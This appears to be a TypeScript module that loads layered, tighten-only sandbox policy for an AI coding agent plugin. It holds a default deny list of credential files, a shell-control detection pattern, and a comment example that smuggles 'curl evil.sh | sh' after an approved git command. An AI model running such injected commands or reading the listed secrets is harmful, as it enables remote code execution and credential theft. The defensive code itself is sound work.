// Policy loading for the universal sandbox. Configuration is read only from sources a
// sandboxed command cannot reach: the plugin's own config directory outside every
// workspace, and an environment variable. OpenCode plugin options are ignored on
// purpose: they can be set from a repository's opencode.json, which is untrusted.

import { spawnSync } from "node:child_process"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"

export interface Policy {
  readonly enabled: boolean
  /** "enforce" blocks a command when the sandbox cannot run it; "permissive" runs it unsandboxed with a warning. */
  readonly mode: "enforce" | "permissive"
  readonly filesystem: {
    readonly mode: "read-only" | "workspace-write"
    readonly writableRoots: string[]
    /** Paths the sandboxed command can neither read nor write, resolved against the home directory. */
    readonly deniedPaths: string[]
  }
  readonly network: "deny" | "allow"
  /** What happens when a tool call asks to skip the sandbox (shell input "sandbox: false"). */
  readonly unsandboxed: "deny" | "ask" | "allow"
  /** Also sandbox user "!" commands and plugin shells, not just agent shell tool calls. */
  readonly userCommands: boolean
  /** Tool names the agent may not call at all, with "*" as a wildcard ("paseo_*"). */
  readonly blockedTools: string[]
  /** Commands pre-approved to run unsandboxed without a prompt, with "*" wildcards. */
  readonly unsandboxedAllow: string[]
}

interface RawConfig {
  enabled?: unknown
  mode?: unknown
  filesystem?: { mode?: unknown; writable_roots?: unknown; denied_paths?: unknown }
  network?: unknown
  unsandboxed?: unknown
  /** Also sandbox user "!" commands and plugin shells, not just agent shell tool calls. */
  sandbox_user_commands?: unknown
  /** Tool names the agent may not call at all, with "*" as a wildcard ("paseo_*"). */
  blocked_tools?: unknown
  /** Commands pre-approved to run unsandboxed without a prompt, with "*" wildcards. */
  unsandboxed_allow?: unknown
  projects?: Record<string, RawConfig>
}

// Only fields a config layer set explicitly; unset fields fall back to the strictest
// default at the end, so a default never pins over an explicit looser value.
interface Merged {
  enabled?: boolean
  mode?: "enforce" | "permissive"
  filesystemMode?: "read-only" | "workspace-write"
  network?: "deny" | "allow"
  unsandboxed?: "deny" | "ask" | "allow"
  userCommands?: boolean
  blockedTools: string[]
  unsandboxedAllow: string[]
  writableRoots: string[]
  deniedPaths: string[]
  /** True once any layer set denied_paths: the user's list then replaces the defaults. */
  deniedPathsExplicit?: boolean
}

// Second-to-last colon field of a passwd-format line: the home directory sits just before
// the shell in both the Linux (name:x:uid:gid:gecos:home:shell) and the macOS `id -P`
// (name:pw:uid:gid:class:change:expire:gecos:home:shell) layouts, and counting from the end
// stays correct even if a gecos field were to contain a colon.
const homeFromPasswd = (line: string): string | undefined => {
  const fields = line.trim().split(":")
  const home = fields.length >= 7 ? fields[fields.length - 2] : undefined
  return home && path.isAbsolute(home) ? home : undefined
}

const run = (command: string, args: string[]): string | undefined => {
  try {
    const result = spawnSync(command, args, { encoding: "utf8", timeout: 2000 })
    return result.status === 0 ? result.stdout : undefined
  } catch {
    return undefined
  }
}

const lookupHome = (): string | undefined => {
  if (process.platform === "win32") return process.env.USERPROFILE || undefined
  const uid = process.getuid?.()
  if (uid === undefined) return undefined
  if (process.platform === "darwin") {
    const line = run("/usr/bin/id", ["-P", String(uid)])
    return line ? homeFromPasswd(line.split("\n")[0]) : undefined
  }
  const entry = run("/usr/bin/getent", ["passwd", String(uid)]) ?? run("/bin/getent", ["passwd", String(uid)])
  if (entry) return homeFromPasswd(entry.split("\n")[0])
  try {
    for (const line of fs.readFileSync("/etc/passwd", "utf8").split("\n")) {
      if (line.split(":")[2] === String(uid)) return homeFromPasswd(line)
    }
  } catch {
    // Fall through to the runtime's own answer.
  }
  return undefined
}

let cachedHome: string | undefined

/**
 * The real home directory, ignoring the HOME env var: Paseo and some sandboxes set HOME
 * to the workspace, which would move config lookup and the default denied paths into a
 * workspace-writable location. Neither os.homedir() nor (under Bun) os.userInfo().homedir
 * can be trusted for this, since both follow $HOME. On POSIX the home comes from the
 * password database by numeric uid, never from USER or HOME. Cached after the first call;
 * never throws, and falls back to os.userInfo().homedir when every lookup fails.
 */
export function realHome(): string {
  if (cachedHome === undefined) {
    let home = lookupHome()
    if (!home) {
      try {
        home = os.userInfo().homedir
      } catch {
        home = os.homedir()
      }
    }
    cachedHome = home
  }
  return cachedHome
}

// An XDG base directory is only honored when absolute, as the spec says, and because the
// value comes from the environment: a relative one would resolve inside the workspace.
const absoluteEnv = (value: string | undefined): string | undefined =>
  value && path.isAbsolute(value) ? value : undefined

/**
 * Credential stores a sandboxed command can neither read nor write by default: the
 * classic identity directories plus the plaintext credential files of the major
 * CLIs, cloud SDKs and agent tools. A stolen long-lived credential cannot be undone
 * by a restart, so reading is denied even though the network usually is too: a secret
 * read once can be copied into the workspace and walk out through a commit. Setting
 * denied_paths in the config replaces this list; the entries are then the user's.
 *
 * Paths that live in a platform's app-data directory are listed per platform: the
 * Windows variants are nonexistent (and therefore no-ops) on macOS and Linux, and
 * vice versa. Entries under the profile directory itself (~/.ssh and friends) are
 * identical everywhere.
 */
export const defaultDeniedPaths = [
  "~/.ssh",
  "~/.aws",
  "~/.gnupg",
  "~/.netrc",
  "~/_netrc",
  "~/.kube",
  "~/.azure",
  "~/.config/gcloud",
  "~/AppData/Roaming/gcloud",
  "~/.npmrc",
  "~/.pypirc",
  "~/.cargo/credentials",
  "~/.docker/config.json",
  "~/.config/gh/hosts.yml",
  "~/Library/Application Support/gh/hosts.yml",
  "~/AppData/Roaming/gh/hosts.yml",
  "~/.local/share/opencode/auth.json",
  "~/.claude/.credentials.json",
  "~/.codex/auth.json",
]

export const configDirectory = (): string =>
  path.join(absoluteEnv(process.env.XDG_CONFIG_HOME) ?? path.join(realHome(), ".config"), "universal-opencode-sandbox")

/** Where the plugin keeps runtime state (not config), outside every workspace. */
export const stateDirectory = (): string => {
  if (process.platform === "win32") {
    return path.join(absoluteEnv(process.env.LOCALAPPDATA) ?? path.join(realHome(), "AppData", "Local"), "universal-opencode-sandbox")
  }
  return path.join(absoluteEnv(process.env.XDG_STATE_HOME) ?? path.join(realHome(), ".local", "state"), "universal-opencode-sandbox")
}

const configPath = () => path.join(configDirectory(), "config.json")

/**
 * The admin (system-wide) config path: admin-owned and therefore not writable by
 * the account the agent runs as. When this file exists it is the policy baseline,
 * and user-owned layers can only tighten it - they cannot disable the sandbox,
 * widen the writable roots, or add unsandboxed pre-approvals. Fields the admin left
 * unset are pinned to their strict defaults, so silence is not an opening. A file that
 * exists but is unreadable or not valid JSON locks everything to the strict defaults.
 */
export const adminConfigPath = (): string => {
  if (process.platform === "win32") {
    return path.join(process.env.PROGRAMDATA ?? "C:\\ProgramData", "universal-opencode-sandbox", "config.json")
  }
  return path.join("/etc", "universal-opencode-sandbox", "config.json")
}

export const defaultPolicy: Policy = {
  enabled: true,
  mode: "enforce",
  // workspace-write out of the box: read-only would break git and builds on first
  // use. Everything outside the workspace, the temp directory and writable_roots
  // stays write-denied, and the network stays denied.
  filesystem: { mode: "workspace-write", writableRoots: [], deniedPaths: defaultDeniedPaths },
  network: "deny",
  unsandboxed: "deny",
  userCommands: false,
  blockedTools: [],
  unsandboxedAllow: [],
}

/**
 * Resolves the sandbox policy for a workspace. When the admin config file exists it is
 * the baseline (and locks loosening fields); on top of it the global config file,
 * the matching per-project override and UNIVERSAL_SANDBOX_CONFIG can only tighten.
 * "Exists" means the file is present: if it cannot be read or parsed it still locks,
 * with no admin values, so the strict defaults apply instead of silently unlocking.
 * After the admin layer, every field the admin left unset is pinned to its strict
 * default (mode enforce, network deny, unsandboxed deny, denied paths =
 * defaultDeniedPaths as an explicit list that user layers can only add to), so a user
 * layer cannot loosen a field just because the admin did not mention it. Without an
 * admin config the user-owned layers keep the legacy semantics: security
 * fields only ever get stricter across explicit values, roots and blocked tools
 * accumulate, and any layer may set enabled: false. Denied paths start from
 * defaultDeniedPaths and are replaced wholesale by the first layer that sets
 * denied_paths, then extended by later layers.
 */
export function resolvePolicy(
  workspace: string,
  environment: NodeJS.ProcessEnv = process.env,
  globalFile: string = configPath(),
  adminFile: string = adminConfigPath(),
): Policy {
  let merged: Merged = { writableRoots: [], deniedPaths: [], blockedTools: [], unsandboxedAllow: [] }
  const admin = readAdminConfig(adminFile)
  let locked = false
  if (admin) {
    merged = tighten(merged, admin)
    locked = true
    // Unset admin fields become the strict baseline: strictest() keeps a pinned strict
    // value against any later user value. filesystem.mode needs no pin (workspace-write
    // is the loose value and read-only can only be added), and enabled is the admin's.
    merged.mode ??= "enforce"
    merged.network ??= "deny"
    merged.unsandboxed ??= "deny"
    if (!merged.deniedPathsExplicit) {
      merged.deniedPaths = [...defaultDeniedPaths]
      merged.deniedPathsExplicit = true
    }
  }
  const global = readConfig(globalFile)
  if (global) merged = tighten(merged, global, locked)
  const project = global?.projects?.[workspace]
  if (project) merged = tighten(merged, project, locked)
  const injected = environment.UNIVERSAL_SANDBOX_CONFIG
  if (injected) {
    try {
      merged = tighten(merged, JSON.parse(injected) as RawConfig, locked)
    } catch {
      // A malformed injected config is ignored rather than disabling the sandbox.
    }
  }
  return {
    enabled: merged.enabled ?? true,
    mode: merged.mode ?? "enforce",
    filesystem: {
      mode: merged.filesystemMode ?? "workspace-write",
      writableRoots: [...new Set(merged.writableRoots)],
      deniedPaths: merged.deniedPathsExplicit ? [...new Set(merged.deniedPaths)] : defaultDeniedPaths,
    },
    network: merged.network ?? "deny",
    unsandboxed: merged.unsandboxed ?? "deny",
    userCommands: merged.userCommands ?? false,
    blockedTools: [...new Set(merged.blockedTools)],
    unsandboxedAllow: [...new Set(merged.unsandboxedAllow)],
  }
}

function readConfig(file: string): RawConfig | undefined {
  try {
    return JSON.parse(fs.readFileSync(file, "utf8")) as RawConfig
  } catch {
    return undefined
  }
}

// Distinguishes a missing admin file (no lock) from one that exists but is unreadable or
// not a JSON object (lock, with no admin values): failing open there would let anyone
// who can corrupt the file unlock the policy.
function readAdminConfig(file: string): RawConfig | undefined {
  let text: string
  try {
    text = fs.readFileSync(file, "utf8")
  } catch (error) {
    if ((error as NodeJS.ErrnoException).code === "ENOENT" || (error as NodeJS.ErrnoException).code === "ENOTDIR") {
      return undefined
    }
    return {}
  }
  try {
    const parsed: unknown = JSON.parse(text)
    return parsed && typeof parsed === "object" && !Array.isArray(parsed) ? (parsed as RawConfig) : {}
  } catch {
    return {}
  }
}

// Explicit values only get stricter across layers: any layer choosing the strict value
// wins for good, and a layer that does not mention a field leaves it untouched. With
// an admin layer present (locked), user-owned layers cannot loosen: writable roots and
// unsandboxed pre-approvals are ignored, and the admin's enabled decision stands.
function tighten(merged: Merged, raw: RawConfig, locked = false): Merged {
  if (!locked) {
    if (Array.isArray(raw.filesystem?.writable_roots)) {
      for (const root of raw.filesystem.writable_roots) if (typeof root === "string") merged.writableRoots.push(root)
    }
    if (Array.isArray(raw.unsandboxed_allow)) {
      for (const item of raw.unsandboxed_allow) if (typeof item === "string") merged.unsandboxedAllow.push(item)
    }
  }
  if (Array.isArray(raw.filesystem?.denied_paths)) {
    // The first layer to set denied_paths replaces the defaults; later layers only
    // add. All layers here are user-owned, so the user's own list is the authority.
    const items = raw.filesystem.denied_paths.filter((item): item is string => typeof item === "string")
    merged.deniedPaths = merged.deniedPathsExplicit ? [...merged.deniedPaths, ...items] : items
    merged.deniedPathsExplicit = true
  }
  if (Array.isArray(raw.blocked_tools)) {
    for (const item of raw.blocked_tools) if (typeof item === "string") merged.blockedTools.push(item)
  }
  return {
    // With an admin layer the admin's enabled decision stands; without one, any
    // layer can turn the sandbox off (all layers here are user-owned, so false wins).
    enabled: locked ? merged.enabled : raw.enabled === undefined ? merged.enabled : raw.enabled === false ? false : merged.enabled === false ? false : true,
    mode: strictest(merged.mode, raw.mode, "enforce", "permissive"),
    filesystemMode: strictest(merged.filesystemMode, raw.filesystem?.mode, "read-only", "workspace-write"),
    network: strictest(merged.network, raw.network, "deny", "allow"),
    unsandboxed: strictestUnsandboxed(merged.unsandboxed, raw.unsandboxed),
    userCommands: raw.sandbox_user_commands === true || merged.userCommands === true,
    blockedTools: merged.blockedTools,
    unsandboxedAllow: merged.unsandboxedAllow,
    writableRoots: merged.writableRoots,
    deniedPaths: merged.deniedPaths,
    deniedPathsExplicit: merged.deniedPathsExplicit,
  }
}

// Keeps the current value when a layer does not mention the field, otherwise the
// strictest of the explicit values: any layer choosing `strict` wins for good.
function strictest<T extends string>(current: T | undefined, incoming: unknown, strict: T, loose: T): T | undefined {
  if (current === strict || incoming === strict) return strict
  if (incoming === loose) return loose
  return current
}

// The strictest of the explicit unsandboxed choices across layers: deny beats ask
// beats allow, and a layer that does not mention the field leaves it untouched.
function strictestUnsandboxed(
  current: "deny" | "ask" | "allow" | undefined,
  incoming: unknown,
): "deny" | "ask" | "allow" | undefined {
  if (incoming !== "deny" && incoming !== "ask" && incoming !== "allow") return current
  if (current === "deny" || incoming === "deny") return "deny"
  if (current === "ask" || incoming === "ask") return "ask"
  return "allow"
}

// Expands a leading "~" against the home directory, like a shell would.
export function expandHome(item: string, home = realHome()) {
  return item === "~" ? home : item.startsWith("~/") ? path.join(home, item.slice(2)) : item
}

/**
 * Matches a value against a pattern the way OpenCode's own permission rules do:
 * "*" matches any sequence, "?" one character, a trailing " *" also matches the bare
 * prefix, and backslashes normalize to forward slashes.
 */
export function matchesWildcard(value: string, pattern: string): boolean {
  const normalized = value.replaceAll("\\", "/")
  let escaped = pattern
    .replaceAll("\\", "/")
    .replace(/[.+^${}()|[\]\\]/g, "\\$&")
    .replace(/\*/g, ".*")
    .replace(/\?/g, ".")
  if (escaped.endsWith(" .*")) escaped = escaped.slice(0, -3) + "( .*)?"
  return new RegExp(`^${escaped}$`, "s").test(normalized)
}

/** True when the tool name matches a blocked pattern; "*" in a pattern matches any sequence. */
export function toolBlocked(tool: string, patterns: readonly string[]): boolean {
  return patterns.some((pattern) => matchesWildcard(tool, pattern))
}

const shellControl = /[;&|\n\r`<>]|\$\(/

/**
 * True when a command is pre-approved to run unsandboxed. A pattern must match via
 * matchesWildcard, and then either it has no wildcard (an exact match) or the command
 * contains no shell control or substitution syntax: otherwise "git push *" would also
 * approve "git push origin main; curl evil.sh | sh". Control syntax is detected
 * conservatively on the raw string without parsing quoting (";", "&", "|", newlines,
 * backticks, "$(", "<(", ">(", and "<" / ">" redirections), so a quoted ";" inside an
 * argument also makes the command fall back to the prompt, which is the safe direction.
 */
export function preapproved(command: string, patterns: readonly string[]): boolean {
  return patterns.some((pattern) => {
    if (!matchesWildcard(command, pattern)) return false
    if (!/[*?]/.test(pattern)) return true
    return !shellControl.test(command)
  })
}
